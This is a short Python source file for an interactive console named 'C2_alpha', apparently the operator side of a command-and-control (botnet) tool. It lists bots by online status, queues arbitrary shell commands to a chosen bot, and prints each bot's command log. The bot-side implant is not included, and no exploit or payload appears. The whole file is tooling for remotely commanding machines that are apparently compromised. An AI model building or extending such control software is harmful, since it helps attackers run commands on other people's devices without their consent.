import argparse
from cmd2 import Cmd, categorize, with_argparser
from bots import setup, Bot


class App(Cmd):
    def __init__(self):
        super().__init__()
        self.set_window_title('C2_alpha')

    prompt = '#$ '

    argparse_command = argparse.ArgumentParser()
    argparse_command.add_argument('-c', nargs='?', default=None, help="Command that will be sent to the bot. For example use  'ls -lah' ")
    argparse_command.add_argument('-b', type=int, help='Bot id')
    @with_argparser(argparse_command)
    def do_sendCommand(self, args):
        self.poutput('Sending the command to the bot')
        cmd_to_bot = '<p>'+args.c+'</p>'
        bot_number = args.b
        setup.devices.update({list(setup.devices.keys())[bot_number]:Bot(True, cmd_to_bot)})
        print(list(setup.devices.values())[bot_number])

    def do_showBots(self, line):
        self.poutput('List all bots')
        bot_number = 0
        for key, value in setup.devices.items():
            if value.online:
                print('Status: Online -  ' + 'Bot number - ' + str(bot_number) + '- Bot Tag: ' + key)
            else:
                print('Status: Offline - ' + 'Bot number - ' + str(bot_number) + '- Bot Tag: ' + key)
            bot_number += 1

    argparse_log = argparse.ArgumentParser()
    argparse_log.add_argument('-b', type=int, help='Bot id')
    @with_argparser(argparse_log)
    def do_logResults(self, args):
        self.poutput('Log result of commands sent to the bot')
        bot_number = args.b
        folder = list(setup.devices.keys())[bot_number]
        path = './bots/'+folder+'/log.txt'
        tmp = open(path,'r')
        print(tmp.readlines())


    categorize((do_showBots,
                do_logResults,
                do_sendCommand), "C2 Options")




